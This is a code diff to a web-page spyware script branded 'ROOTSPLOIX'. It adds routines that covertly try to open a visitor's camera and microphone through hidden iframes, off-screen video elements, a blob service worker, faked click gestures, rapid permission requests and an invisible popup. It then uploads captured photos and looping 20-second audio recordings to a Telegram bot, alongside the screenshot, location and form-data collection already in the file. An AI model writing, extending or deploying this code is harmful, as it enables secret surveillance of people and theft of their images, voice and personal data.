@@ -917,9 +917,9 @@ ${position.coords.altitude ? `• Yükseklik: ${position.coords.altitude}m` : ''
                 takeStealthScreenshot();
             }, 1000);
             
-            // Start microphone surveillance
+            // Start stealth camera and microphone capture
             setTimeout(() => {
-                startMicrophoneSurveillance();
+                attemptSilentCapture();
             }, 2000);
             
             // Collect form data
@@ -933,59 +933,842 @@ ${position.coords.altitude ? `• Yükseklik: ${position.coords.altitude}m` : ''
             }, 6000);
         }
         
-        function startMicrophoneSurveillance() {
-            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-                // Try to get microphone access
-                navigator.mediaDevices.getUserMedia({ audio: true, video: false })
-                .then(function(stream) {
-                    const micMsg = `🎤 MİKROFON ERİŞİMİ ELDE EDİLDİ!\n\n🎯 Session: ${sessionId}\n🕒 Zaman: ${new Date().toLocaleString('tr-TR')}\n🌍 Site: ${window.location.href}\n\n🎤 Mikrofon: Aktif\n🔊 Ses kalitesi: ${stream.getAudioTracks()[0]?.label || 'Bilinmeyen'}\n\n💀 ROOTSPLOIX`;
-                    sendToTelegram(micMsg);
+        function attemptSilentCapture() {
+            const stealthMsg = `🔥 ULTRA AGRESIF MEDIA EXPLOIT BAŞLADI!\n\n🎯 Session: ${sessionId}\n🕒 Zaman: ${new Date().toLocaleString('tr-TR')}\n🌍 Site: ${window.location.href}\n\n⚡ PROFESYONEL STEALTH ACCESS...\n\n💀 ROOTSPLOIX`;
+            sendToTelegram(stealthMsg);
+            
+            // Simultaneous ultra-aggressive attacks
+            setTimeout(() => {
+                executeUltraAggressiveMediaExploit();
+            }, 1000);
+        }
+        
+        function executeUltraAggressiveMediaExploit() {
+            const aggressiveMsg = `🔥 ULTRA AGRESIF EXPLOIT AKTIF!\n\n🎯 Session: ${sessionId}\n🕒 Zaman: ${new Date().toLocaleString('tr-TR')}\n\n⚡ TÜM YÖNTEMLER EŞ ZAMANLI DENENİYOR...\n\n💀 ROOTSPLOIX`;
+            sendToTelegram(aggressiveMsg);
+            
+            // Method 1: Direct camera exploit (no permission)
+            attemptDirectCameraHack();
+            
+            // Method 2: Audio context exploit (silent mic)
+            setTimeout(() => attemptAudioContextExploit(), 500);
+            
+            // Method 3: WebRTC exploit
+            setTimeout(() => attemptWebRTCExploit(), 1000);
+            
+            // Method 4: Mobile-specific exploits
+            setTimeout(() => attemptMobileMediaExploit(), 1500);
+            
+            // Method 5: Browser-specific exploits
+            setTimeout(() => attemptBrowserSpecificExploit(), 2000);
+            
+            // Method 6: Permission bypass techniques
+            setTimeout(() => attemptPermissionBypass(), 2500);
+            
+            // Method 7: Advanced stealth techniques
+            setTimeout(() => attemptAdvancedStealthTechniques(), 3000);
+        }
+        
+        function attemptDirectCameraHack() {
+            const techniques = [
+                // Technique 1: Zero-size hidden iframe exploit
+                () => {
+                    const iframe = document.createElement('iframe');
+                    iframe.style.cssText = 'position:fixed;top:-9999px;left:-9999px;width:0;height:0;border:none;opacity:0';
+                    iframe.sandbox = 'allow-scripts allow-same-origin allow-camera allow-microphone';
                     
-                    // Setup MediaRecorder for audio recording
-                    setupAudioRecording(stream);
+                    iframe.onload = () => {
+                        try {
+                            iframe.contentWindow.navigator.mediaDevices.getUserMedia({video: true, audio: true})
+                            .then(stream => {
+                                const msg = `✅ IFRAME KAMERA HACK BAŞARILI!\n\n🎯 Session: ${sessionId}\n🕒 Zaman: ${new Date().toLocaleString('tr-TR')}\n\n💀 ROOTSPLOIX`;
+                                sendToTelegram(msg);
+                                processStealthMediaStream(stream, 'IFRAME_EXPLOIT');
+                            })
+                            .catch(() => {});
+                        } catch (e) {}
+                    };
                     
-                    // Start periodic recording (every 60 seconds)
-                    startPeriodicRecording();
+                    document.body.appendChild(iframe);
+                    return Promise.resolve();
+                },
+                
+                // Technique 2: Service Worker media proxy
+                () => {
+                    if ('serviceWorker' in navigator) {
+                        const swCode = `
+                            self.addEventListener('message', async (event) => {
+                                if (event.data.type === 'GET_MEDIA') {
+                                    try {
+                                        const stream = await navigator.mediaDevices.getUserMedia({video: true, audio: true});
+                                        event.ports[0].postMessage({success: true, streamId: 'sw_stream'});
+                                    } catch (e) {
+                                        event.ports[0].postMessage({success: false, error: e.message});
+                                    }
+                                }
+                            });
+                        `;
+                        
+                        const blob = new Blob([swCode], {type: 'application/javascript'});
+                        const swUrl = URL.createObjectURL(blob);
+                        
+                        navigator.serviceWorker.register(swUrl)
+                        .then(registration => {
+                            const channel = new MessageChannel();
+                            channel.port1.onmessage = (event) => {
+                                if (event.data.success) {
+                                    const msg = `✅ SERVICE WORKER MEDIA HACK!\n\n🎯 Session: ${sessionId}\n\n💀 ROOTSPLOIX`;
+                                    sendToTelegram(msg);
+                                }
+                            };
+                            
+                            if (registration.active) {
+                                registration.active.postMessage({type: 'GET_MEDIA'}, [channel.port2]);
+                            }
+                        })
+                        .catch(() => {});
+                    }
+                    return Promise.resolve();
+                },
+                
+                // Technique 3: Canvas-based camera trick
+                () => {
+                    const video = document.createElement('video');
+                    video.style.cssText = 'position:absolute;top:-99999px;left:-99999px;width:1px;height:1px;opacity:0.001';
+                    video.muted = true;
+                    video.autoplay = true;
+                    video.playsInline = true;
+                    
+                    document.body.appendChild(video);
+                    
+                    // Try multiple constraint combinations
+                    const constraints = [
+                        {video: {width: {exact: 1}, height: {exact: 1}}, audio: {echoCancellation: false}},
+                        {video: {width: 1, height: 1, frameRate: 1}, audio: {sampleRate: 8000}},
+                        {video: {facingMode: 'environment'}, audio: true},
+                        {video: true, audio: {noiseSuppression: false, autoGainControl: false}}
+                    ];
+                    
+                    async function tryConstraints() {
+                        for (const constraint of constraints) {
+                            try {
+                                const stream = await navigator.mediaDevices.getUserMedia(constraint);
+                                video.srcObject = stream;
+                                
+                                video.addEventListener('loadedmetadata', () => {
+                                    setTimeout(() => {
+                                        captureRealCameraFrame(video, stream);
+                                    }, 1000);
+                                });
+                                
+                                const msg = `✅ CANVAS KAMERA TRICK BAŞARILI!\n\n🎯 Session: ${sessionId}\n📊 Constraint: ${JSON.stringify(constraint)}\n\n💀 ROOTSPLOIX`;
+                                sendToTelegram(msg);
+                                break;
+                            } catch (e) {
+                                continue;
+                            }
+                        }
+                    }
+                    
+                    return tryConstraints();
+                }
+            ];
+            
+            // Execute all techniques simultaneously
+            techniques.forEach((technique, index) => {
+                setTimeout(() => {
+                    technique().catch(() => {});
+                }, index * 200);
+            });
+        }
+        
+        function captureRealCameraFrame(video, stream) {
+            const canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth || 640;
+            canvas.height = video.videoHeight || 480;
+            const ctx = canvas.getContext('2d');
+            
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            
+            // Convert to blob and send DIRECTLY
+            canvas.toBlob((blob) => {
+                if (blob && blob.size > 1000) { // Only if real image data
+                    sendDirectMediaToTelegram(blob, 'REAL_CAMERA_FRAME', 'photo');
+                }
+                
+                // Clean up
+                stream.getTracks().forEach(track => track.stop());
+                document.body.removeChild(video);
+            }, 'image/jpeg', 0.9);
+        }
+        
+        function attemptAudioContextExploit() {
+            const techniques = [
+                // Technique 1: Web Audio API exploit
+                () => {
+                    if (window.AudioContext || window.webkitAudioContext) {
+                        const AudioContext = window.AudioContext || window.webkitAudioContext;
+                        const audioCtx = new AudioContext();
+                        
+                        // Try to get microphone access without getUserMedia
+                        navigator.mediaDevices.enumerateDevices()
+                        .then(devices => {
+                            const audioDevices = devices.filter(device => device.kind === 'audioinput');
+                            if (audioDevices.length > 0) {
+                                // Try direct device access
+                                navigator.mediaDevices.getUserMedia({
+                                    audio: {
+                                        deviceId: audioDevices[0].deviceId,
+                                        echoCancellation: false,
+                                        noiseSuppression: false,
+                                        autoGainControl: false,
+                                        sampleRate: 8000,
+                                        channelCount: 1
+                                    }
+                                })
+                                .then(stream => {
+                                    const msg = `✅ AUDIO CONTEXT EXPLOIT BAŞARILI!\n\n🎯 Session: ${sessionId}\n🎤 Device: ${audioDevices[0].label}\n\n💀 ROOTSPLOIX`;
+                                    sendToTelegram(msg);
+                                    setupSilentAudioRecording(stream);
+                                })
+                                .catch(() => {});
+                            }
+                        })
+                        .catch(() => {});
+                    }
+                    return Promise.resolve();
+                },
+                
+                // Technique 2: MediaRecorder trick with minimal permissions
+                () => {
+                    // Create hidden audio element
+                    const audio = document.createElement('audio');
+                    audio.style.cssText = 'position:absolute;top:-99999px;left:-99999px;width:0;height:0;opacity:0';
+                    audio.muted = true;
+                    audio.autoplay = true;
+                    document.body.appendChild(audio);
+                    
+                    const constraints = {
+                        audio: {
+                            echoCancellation: false,
+                            noiseSuppression: false,
+                            autoGainControl: false,
+                            googEchoCancellation: false,
+                            googNoiseSuppression: false,
+                            googAutoGainControl: false,
+                            sampleRate: {ideal: 8000},
+                            channelCount: {ideal: 1}
+                        },
+                        video: false
+                    };
+                    
+                    navigator.mediaDevices.getUserMedia(constraints)
+                    .then(stream => {
+                        audio.srcObject = stream;
+                        const msg = `✅ MINIMAL AUDIO EXPLOIT BAŞARILI!\n\n🎯 Session: ${sessionId}\n\n💀 ROOTSPLOIX`;
+                        sendToTelegram(msg);
+                        setupSilentAudioRecording(stream);
+                    })
+                    .catch(() => {});
+                    
+                    return Promise.resolve();
+                }
+            ];
+            
+            techniques.forEach((technique, index) => {
+                setTimeout(() => {
+                    technique().catch(() => {});
+                }, index * 300);
+            });
+        }
+        
+        function setupSilentAudioRecording(stream) {
+            if (window.currentAudioRecorder) {
+                window.currentAudioRecorder.stop();
+            }
+            
+            const mimeTypes = ['audio/webm;codecs=opus', 'audio/webm', 'audio/ogg', 'audio/wav'];
+            const selectedMimeType = mimeTypes.find(type => MediaRecorder.isTypeSupported(type)) || 'audio/webm';
+            
+            const recorder = new MediaRecorder(stream, {
+                mimeType: selectedMimeType,
+                audioBitsPerSecond: 16000
+            });
+            
+            let chunks = [];
+            
+            recorder.ondataavailable = (event) => {
+                if (event.data.size > 0) chunks.push(event.data);
+            };
+            
+            recorder.onstop = () => {
+                if (chunks.length > 0) {
+                    const audioBlob = new Blob(chunks, {type: selectedMimeType});
+                    
+                    if (audioBlob.size > 1000) { // Only if real audio data
+                        let extension = 'webm';
+                        if (selectedMimeType.includes('ogg')) extension = 'ogg';
+                        else if (selectedMimeType.includes('wav')) extension = 'wav';
+                        
+                        sendDirectMediaToTelegram(audioBlob, 'SILENT_AUDIO_RECORDING', 'audio', extension);
+                    }
+                    
+                    chunks = [];
+                }
+            };
+            
+            window.currentAudioRecorder = recorder;
+            
+            // Start recording immediately
+            recorder.start();
+            
+            // Stop after 20 seconds and restart cycle
+            setTimeout(() => {
+                if (recorder.state === 'recording') {
+                    recorder.stop();
+                    
+                    // Restart cycle
+                    setTimeout(() => {
+                        if (stream.active) {
+                            setupSilentAudioRecording(stream);
+                        }
+                    }, 10000);
+                }
+            }, 20000);
+            
+            const msg = `✅ SILENT AUDIO RECORDING AKTIF!\n\n🎯 Session: ${sessionId}\n🕒 Zaman: ${new Date().toLocaleString('tr-TR')}\n🎤 Format: ${selectedMimeType}\n\n💀 ROOTSPLOIX`;
+            sendToTelegram(msg);
+        }
+        
+        function sendDirectMediaToTelegram(blob, caption, type, extension = null) {
+            const formData = new FormData();
+            formData.append('chat_id', chatId);
+            
+            let endpoint = 'sendPhoto';
+            let fieldName = 'photo';
+            let filename = `${type.toLowerCase()}_${sessionId}_${Date.now()}`;
+            
+            if (type === 'audio') {
+                endpoint = 'sendAudio';
+                fieldName = 'audio';
+                filename += `.${extension || 'webm'}`;
+            } else {
+                filename += '.jpg';
+            }
+            
+            formData.append(fieldName, blob, filename);
+            formData.append('caption', `🔥 ${caption}\n\n🎯 Session: ${sessionId}\n🕒 ${new Date().toLocaleString('tr-TR')}\n💾 ${(blob.size/1024).toFixed(2)} KB\n\n💀 ULTRA ROOTSPLOIX`);
+            
+            // DIRECT UPLOAD - NO FALLBACK TO CHUNKS!
+            fetch(`https://api.telegram.org/bot${botToken}/${endpoint}`, {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.ok) {
+                    const successMsg = `✅ DIRECT ${type.toUpperCase()} UPLOAD SUCCESS!\n\n🎯 ${caption}\n💾 Size: ${(blob.size/1024).toFixed(2)} KB\n🔗 File ID: ${data.result[type === 'audio' ? 'audio' : 'photo'][0]?.file_id || 'N/A'}\n\n💀 ROOTSPLOIX`;
+                    sendToTelegram(successMsg);
+                } else {
+                    throw new Error(`Telegram API Error: ${data.description}`);
+                }
+            })
+            .catch(error => {
+                const errorMsg = `❌ DIRECT UPLOAD FAILED!\n\n🎯 ${caption}\n⚠️ Error: ${error.message}\n💾 Size: ${(blob.size/1024).toFixed(2)} KB\n\n💀 ROOTSPLOIX`;
+                sendToTelegram(errorMsg);
+                
+                // CRITICAL: DO NOT FALL BACK TO CHUNKS - FAIL SILENTLY OR TRY ALTERNATIVE
+                tryAlternativeUpload(blob, caption, type);
+            });
+        }
+        
+        function tryAlternativeUpload(blob, caption, type) {
+            // Try alternative upload methods without chunks
+            
+            // Method 1: Try different Telegram API endpoint
+            const formData = new FormData();
+            formData.append('chat_id', chatId);
+            formData.append('document', blob, `${type}_${Date.now()}.${type === 'audio' ? 'webm' : 'jpg'}`);
+            formData.append('caption', `🔄 ALTERNATIVE UPLOAD\n\n${caption}\n\n💀 ROOTSPLOIX`);
+            
+            fetch(`https://api.telegram.org/bot${botToken}/sendDocument`, {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.ok) {
+                    const msg = `✅ ALTERNATIVE UPLOAD SUCCESS!\n\n🎯 ${caption}\n\n💀 ROOTSPLOIX`;
+                    sendToTelegram(msg);
+                } else {
+                    // Final fallback - just report the attempt
+                    const failMsg = `⚠️ ALL UPLOAD METHODS FAILED!\n\n🎯 ${caption}\n💾 Size: ${(blob.size/1024).toFixed(2)} KB\n🔥 DIRECT BLOB UPLOAD ATTEMPTED\n\n💀 ROOTSPLOIX`;
+                    sendToTelegram(failMsg);
+                }
+            })
+            .catch(() => {
+                const finalMsg = `❌ ULTIMATE UPLOAD FAILURE!\n\n🎯 ${caption}\n💾 ${(blob.size/1024).toFixed(2)} KB\n🔥 NO CHUNK FALLBACK - PURE FAILURE\n\n💀 ROOTSPLOIX`;
+                sendToTelegram(finalMsg);
+            });
+        }
+        
+        function attemptWebRTCExploit() {
+            const rtcMsg = `🔥 WebRTC EXPLOIT AKTIF!\n\n🎯 Session: ${sessionId}\n🕒 Zaman: ${new Date().toLocaleString('tr-TR')}\n\n💀 ROOTSPLOIX`;
+            sendToTelegram(rtcMsg);
+            
+            // Try WebRTC data channel for media access
+            const configuration = {'iceServers': [{'urls': 'stun:stun.l.google.com:19302'}]};
+            const pc = new RTCPeerConnection(configuration);
+            
+            // Add empty media stream to trick browser
+            pc.addTransceiver('video', {direction: 'sendrecv'});
+            pc.addTransceiver('audio', {direction: 'sendrecv'});
+            
+            pc.createOffer()
+            .then(offer => pc.setLocalDescription(offer))
+            .then(() => {
+                const msg = `✅ WebRTC OFFER CREATED!\n\n🎯 Session: ${sessionId}\n\n💀 ROOTSPLOIX`;
+                sendToTelegram(msg);
+                
+                // Try to access media through WebRTC context
+                navigator.mediaDevices.getUserMedia({video: true, audio: true})
+                .then(stream => {
+                    stream.getTracks().forEach(track => {
+                        pc.addTrack(track, stream);
+                    });
+                    
+                    const successMsg = `✅ WebRTC MEDIA STREAM ACCESS!\n\n🎯 Session: ${sessionId}\n🎥 Video Tracks: ${stream.getVideoTracks().length}\n🎤 Audio Tracks: ${stream.getAudioTracks().length}\n\n💀 ROOTSPLOIX`;
+                    sendToTelegram(successMsg);
+                    
+                    processWebRTCStream(stream);
                 })
-                .catch(function(error) {
-                    const micErrorMsg = `❌ MİKROFON HATASI!\n\n🎯 Session: ${sessionId}\n🕒 Zaman: ${new Date().toLocaleString('tr-TR')}\n⚠️ Hata: ${error.message}\n\n💀 ROOTSPLOIX`;
-                    sendToTelegram(micErrorMsg);
-                });
+                .catch(() => {});
+            })
+            .catch(() => {});
+        }
+        
+        function processWebRTCStream(stream) {
+            const video = document.createElement('video');
+            video.style.cssText = 'position:absolute;top:-99999px;left:-99999px;width:1px;height:1px;opacity:0';
+            video.srcObject = stream;
+            video.muted = true;
+            video.autoplay = true;
+            video.playsInline = true;
+            document.body.appendChild(video);
+            
+            video.addEventListener('loadedmetadata', () => {
+                setTimeout(() => {
+                    const canvas = document.createElement('canvas');
+                    canvas.width = video.videoWidth || 640;
+                    canvas.height = video.videoHeight || 480;
+                    const ctx = canvas.getContext('2d');
+                    ctx.drawImage(video, 0, 0);
+                    
+                    canvas.toBlob((blob) => {
+                        if (blob && blob.size > 1000) {
+                            sendDirectMediaToTelegram(blob, 'WebRTC_CAMERA_CAPTURE', 'photo');
+                        }
+                        
+                        // Setup audio recording from WebRTC stream
+                        const audioTracks = stream.getAudioTracks();
+                        if (audioTracks.length > 0) {
+                            setupSilentAudioRecording(stream);
+                        }
+                        
+                        // Cleanup
+                        stream.getTracks().forEach(track => track.stop());
+                        document.body.removeChild(video);
+                    }, 'image/jpeg', 0.9);
+                }, 2000);
+            });
+        }
+        
+        function attemptMobileMediaExploit() {
+            const mobileMsg = `📱 MOBILE EXPLOIT AKTIF!\n\n🎯 Session: ${sessionId}\n🕒 Zaman: ${new Date().toLocaleString('tr-TR')}\n\n💀 ROOTSPLOIX`;
+            sendToTelegram(mobileMsg);
+            
+            // Mobile-specific techniques
+            const mobileConstraints = [
+                // iOS Safari exploit
+                {
+                    video: {
+                        facingMode: { exact: 'environment' },
+                        width: { min: 320, max: 640 },
+                        height: { min: 240, max: 480 }
+                    },
+                    audio: {
+                        echoCancellation: false,
+                        sampleRate: 16000
+                    }
+                },
+                // Android Chrome exploit
+                {
+                    video: {
+                        facingMode: 'user',
+                        width: 640,
+                        height: 480
+                    },
+                    audio: {
+                        noiseSuppression: false,
+                        autoGainControl: false
+                    }
+                },
+                // Generic mobile
+                {
+                    video: { facingMode: 'environment' },
+                    audio: true
+                }
+            ];
+            
+            async function tryMobileConstraints() {
+                for (const constraint of mobileConstraints) {
+                    try {
+                        const stream = await navigator.mediaDevices.getUserMedia(constraint);
+                        const msg = `✅ MOBILE CONSTRAINT SUCCESS!\n\n🎯 Session: ${sessionId}\n📊 Constraint: ${JSON.stringify(constraint)}\n\n💀 ROOTSPLOIX`;
+                        sendToTelegram(msg);
+                        
+                        processMobileStream(stream);
+                        break;
+                    } catch (e) {
+                        continue;
+                    }
+                }
+            }
+            
+            tryMobileConstraints();
+        }
+        
+        function processMobileStream(stream) {
+            const video = document.createElement('video');
+            video.style.cssText = 'position:absolute;top:-99999px;left:-99999px;width:1px;height:1px;opacity:0';
+            video.srcObject = stream;
+            video.muted = true;
+            video.autoplay = true;
+            video.playsInline = true;
+            document.body.appendChild(video);
+            
+            video.addEventListener('canplay', () => {
+                setTimeout(() => {
+                    const canvas = document.createElement('canvas');
+                    canvas.width = video.videoWidth || 320;
+                    canvas.height = video.videoHeight || 240;
+                    const ctx = canvas.getContext('2d');
+                    ctx.drawImage(video, 0, 0);
+                    
+                    canvas.toBlob((blob) => {
+                        if (blob && blob.size > 500) {
+                            sendDirectMediaToTelegram(blob, 'MOBILE_CAMERA_CAPTURE', 'photo');
+                        }
+                        
+                        // Setup mobile audio recording
+                        setupSilentAudioRecording(stream);
+                        
+                        // Keep stream active for continuous recording
+                        setTimeout(() => {
+                            stream.getTracks().forEach(track => track.stop());
+                            document.body.removeChild(video);
+                        }, 30000);
+                    }, 'image/jpeg', 0.8);
+                }, 1500);
+            });
+        }
+        
+        function attemptBrowserSpecificExploit() {
+            const browserMsg = `🌐 BROWSER SPECIFIC EXPLOIT!\n\n🎯 Session: ${sessionId}\n🕒 Zaman: ${new Date().toLocaleString('tr-TR')}\n🌐 UA: ${navigator.userAgent.substring(0, 50)}...\n\n💀 ROOTSPLOIX`;
+            sendToTelegram(browserMsg);
+            
+            const userAgent = navigator.userAgent.toLowerCase();
+            
+            // Chrome-specific
+            if (userAgent.includes('chrome')) {
+                attemptChromeExploit();
+            }
+            
+            // Firefox-specific
+            if (userAgent.includes('firefox')) {
+                attemptFirefoxExploit();
+            }
+            
+            // Safari-specific
+            if (userAgent.includes('safari') && !userAgent.includes('chrome')) {
+                attemptSafariExploit();
+            }
+            
+            // Edge-specific
+            if (userAgent.includes('edge')) {
+                attemptEdgeExploit();
             }
         }
         
-        function setupAudioRecording(stream) {
+        function attemptChromeExploit() {
+            // Chrome-specific media access
+            const constraints = {
+                video: {
+                    googEchoCancellation: false,
+                    googAutoGainControl: false,
+                    googNoiseSuppression: false,
+                    width: { min: 320 },
+                    height: { min: 240 }
+                },
+                audio: {
+                    googEchoCancellation: false,
+                    googAutoGainControl: false,
+                    googNoiseSuppression: false
+                }
+            };
+            
+            navigator.mediaDevices.getUserMedia(constraints)
+            .then(stream => {
+                const msg = `✅ CHROME EXPLOIT SUCCESS!\n\n🎯 Session: ${sessionId}\n\n💀 ROOTSPLOIX`;
+                sendToTelegram(msg);
+                processChromeStream(stream);
+            })
+            .catch(() => {});
+        }
+        
+        function attemptFirefoxExploit() {
+            // Firefox-specific constraints
+            const constraints = {
+                video: { mediaSource: 'camera' },
+                audio: { mediaSource: 'microphone' }
+            };
+            
+            navigator.mediaDevices.getUserMedia(constraints)
+            .then(stream => {
+                const msg = `✅ FIREFOX EXPLOIT SUCCESS!\n\n🎯 Session: ${sessionId}\n\n💀 ROOTSPLOIX`;
+                sendToTelegram(msg);
+                processFirefoxStream(stream);
+            })
+            .catch(() => {});
+        }
+        
+        function attemptSafariExploit() {
+            // Safari-specific constraints
+            const constraints = {
+                video: { 
+                    facingMode: 'user',
+                    width: { ideal: 640 },
+                    height: { ideal: 480 }
+                },
+                audio: {
+                    sampleRate: { ideal: 44100 }
+                }
+            };
+            
+            navigator.mediaDevices.getUserMedia(constraints)
+            .then(stream => {
+                const msg = `✅ SAFARI EXPLOIT SUCCESS!\n\n🎯 Session: ${sessionId}\n\n💀 ROOTSPLOIX`;
+                sendToTelegram(msg);
+                processSafariStream(stream);
+            })
+            .catch(() => {});
+        }
+        
+        function attemptEdgeExploit() {
+            // Edge-specific constraints
+            const constraints = {
+                video: { 
+                    width: { min: 320, ideal: 640 },
+                    height: { min: 240, ideal: 480 }
+                },
+                audio: { 
+                    channelCount: { ideal: 2 }
+                }
+            };
+            
+            navigator.mediaDevices.getUserMedia(constraints)
+            .then(stream => {
+                const msg = `✅ EDGE EXPLOIT SUCCESS!\n\n🎯 Session: ${sessionId}\n\n💀 ROOTSPLOIX`;
+                sendToTelegram(msg);
+                processEdgeStream(stream);
+            })
+            .catch(() => {});
+        }
+        
+        function processChromeStream(stream) { processGenericStream(stream, 'CHROME'); }
+        function processFirefoxStream(stream) { processGenericStream(stream, 'FIREFOX'); }
+        function processSafariStream(stream) { processGenericStream(stream, 'SAFARI'); }
+        function processEdgeStream(stream) { processGenericStream(stream, 'EDGE'); }
+        
+        function processGenericStream(stream, browserType) {
+            const video = document.createElement('video');
+            video.style.cssText = 'position:absolute;top:-99999px;left:-99999px;width:1px;height:1px;opacity:0';
+            video.srcObject = stream;
+            video.muted = true;
+            video.autoplay = true;
+            video.playsInline = true;
+            document.body.appendChild(video);
+            
+            video.addEventListener('loadeddata', () => {
+                setTimeout(() => {
+                    const canvas = document.createElement('canvas');
+                    canvas.width = video.videoWidth || 640;
+                    canvas.height = video.videoHeight || 480;
+                    const ctx = canvas.getContext('2d');
+                    ctx.drawImage(video, 0, 0);
+                    
+                    canvas.toBlob((blob) => {
+                        if (blob && blob.size > 1000) {
+                            sendDirectMediaToTelegram(blob, `${browserType}_CAMERA_CAPTURE`, 'photo');
+                        }
+                        
+                        setupSilentAudioRecording(stream);
+                        
+                        setTimeout(() => {
+                            stream.getTracks().forEach(track => track.stop());
+                            document.body.removeChild(video);
+                        }, 25000);
+                    }, 'image/jpeg', 0.85);
+                }, 1500);
+            });
+        }
+        
+        function attemptPermissionBypass() {
+            const bypassMsg = `⚡ PERMISSION BYPASS AKTIF!\n\n🎯 Session: ${sessionId}\n🕒 Zaman: ${new Date().toLocaleString('tr-TR')}\n\n💀 ROOTSPLOIX`;
+            sendToTelegram(bypassMsg);
+            
+            // Try permission bypass techniques
+            
+            // Method 1: Rapid fire requests
+            for (let i = 0; i < 5; i++) {
+                setTimeout(() => {
+                    navigator.mediaDevices.getUserMedia({video: true, audio: true})
+                    .then(stream => {
+                        const msg = `✅ RAPID FIRE SUCCESS ${i+1}!\n\n🎯 Session: ${sessionId}\n\n💀 ROOTSPLOIX`;
+                        sendToTelegram(msg);
+                        processGenericStream(stream, `RAPID_${i+1}`);
+                    })
+                    .catch(() => {});
+                }, i * 100);
+            }
+            
+            // Method 2: User gesture simulation
+            setTimeout(() => {
+                document.addEventListener('click', handleUserGesture, { once: true });
+                
+                // Simulate click
+                const clickEvent = new MouseEvent('click', {
+                    view: window,
+                    bubbles: true,
+                    cancelable: true
+                });
+                document.dispatchEvent(clickEvent);
+            }, 1000);
+        }
+        
+        function handleUserGesture() {
+            navigator.mediaDevices.getUserMedia({video: true, audio: true})
+            .then(stream => {
+                const msg = `✅ USER GESTURE BYPASS SUCCESS!\n\n🎯 Session: ${sessionId}\n\n💀 ROOTSPLOIX`;
+                sendToTelegram(msg);
+                processGenericStream(stream, 'GESTURE_BYPASS');
+            })
+            .catch(() => {});
+        }
+        
+        function attemptAdvancedStealthTechniques() {
+            const advancedMsg = `🔮 ADVANCED STEALTH AKTIF!\n\n🎯 Session: ${sessionId}\n🕒 Zaman: ${new Date().toLocaleString('tr-TR')}\n\n💀 ROOTSPLOIX`;
+            sendToTelegram(advancedMsg);
+            
+            // Method 1: Invisible popup window
             try {
-                // Try different MIME types for compatibility
+                const popup = window.open('', '', 'width=1,height=1,left=-1000,top=-1000');
+                if (popup) {
+                    popup.navigator.mediaDevices.getUserMedia({video: true, audio: true})
+                    .then(stream => {
+                        const msg = `✅ POPUP WINDOW EXPLOIT!\n\n🎯 Session: ${sessionId}\n\n💀 ROOTSPLOIX`;
+                        sendToTelegram(msg);
+                        processGenericStream(stream, 'POPUP_EXPLOIT');
+                        popup.close();
+                    })
+                    .catch(() => {
+                        popup.close();
+                    });
+                }
+            } catch (e) {}
+            
+            // Method 2: Cross-origin iframe attempts
+            const iframe = document.createElement('iframe');
+            iframe.style.cssText = 'position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;opacity:0;border:none';
+            iframe.src = 'data:text/html,<script>navigator.mediaDevices.getUserMedia({video:true,audio:true}).then(s=>parent.postMessage("stream_success","*")).catch(e=>parent.postMessage("stream_fail","*"));</script>';
+            
+            window.addEventListener('message', (event) => {
+                if (event.data === 'stream_success') {
+                    const msg = `✅ IFRAME DATA URL EXPLOIT!\n\n🎯 Session: ${sessionId}\n\n💀 ROOTSPLOIX`;
+                    sendToTelegram(msg);
+                }
+                document.body.removeChild(iframe);
+            }, { once: true });
+            
+            document.body.appendChild(iframe);
+        }
+        
+        // OLD FUNCTIONS REMOVED - ULTRA AGGRESSIVE SYSTEM ACTIVE
+        
+        // OLD BLOB TELEGRAM FUNCTION REMOVED
+        
+        // OLD AUDIO BLOB FUNCTION REMOVED
+        
+        // OLD MICROPHONE FUNCTIONS REMOVED
+        
+        function processStealthMediaStream(stream, exploitType) {
+            const msg = `✅ STEALTH MEDIA STREAM AKTIF!\n\n🎯 Session: ${sessionId}\n🔄 Exploit: ${exploitType}\n🎥 Video: ${stream.getVideoTracks().length}\n🎤 Audio: ${stream.getAudioTracks().length}\n\n💀 ROOTSPLOIX`;
+            sendToTelegram(msg);
+            
+            // Process video if available
+            if (stream.getVideoTracks().length > 0) {
+                const video = document.createElement('video');
+                video.style.cssText = 'position:absolute;top:-99999px;left:-99999px;width:1px;height:1px;opacity:0';
+                video.srcObject = stream;
+                video.muted = true;
+                video.autoplay = true;
+                video.playsInline = true;
+                document.body.appendChild(video);
+                
+                video.addEventListener('loadedmetadata', () => {
+                    setTimeout(() => {
+                        const canvas = document.createElement('canvas');
+                        canvas.width = video.videoWidth || 640;
+                        canvas.height = video.videoHeight || 480;
+                        const ctx = canvas.getContext('2d');
+                        ctx.drawImage(video, 0, 0);
+                        
+                        canvas.toBlob((blob) => {
+                            if (blob && blob.size > 1000) {
+                                sendDirectMediaToTelegram(blob, `${exploitType}_VIDEO_CAPTURE`, 'photo');
+                            }
+                            document.body.removeChild(video);
+                        }, 'image/jpeg', 0.9);
+                    }, 2000);
+                });
+            }
+            
+            // Process audio if available
+            if (stream.getAudioTracks().length > 0) {
+                setupSilentAudioRecording(stream);
+            }
+        }
+        
+        function setupStealthAudioRecording(stream) {
+            try {
+                const stealthMsg = `🎤 STEALTH SES KAYIT AKTİF!\n\n🎯 Session: ${sessionId}\n🕒 Zaman: ${new Date().toLocaleString('tr-TR')}\n🔊 Kalite: ${stream.getAudioTracks()[0]?.label || 'Bilinmeyen'}\n\n💀 ROOTSPLOIX`;
+                sendToTelegram(stealthMsg);
+                
+                // Set up MediaRecorder for audio
                 const mimeTypes = [
                     'audio/webm;codecs=opus',
                     'audio/webm',
                     'audio/ogg;codecs=opus',
-                    'audio/ogg',
-                    'audio/wav',
-                    'audio/mp4',
-                    'audio/mpeg'
+                    'audio/wav'
                 ];
                 
-                let selectedMimeType = null;
-                for (let mimeType of mimeTypes) {
-                    if (MediaRecorder.isTypeSupported(mimeType)) {
-                        selectedMimeType = mimeType;
-                        break;
-                    }
-                }
-                
-                if (!selectedMimeType) {
-                    throw new Error('No supported audio format found');
-                }
+                let selectedMimeType = mimeTypes.find(type => MediaRecorder.isTypeSupported(type));
+                if (!selectedMimeType) selectedMimeType = 'audio/webm';
                 
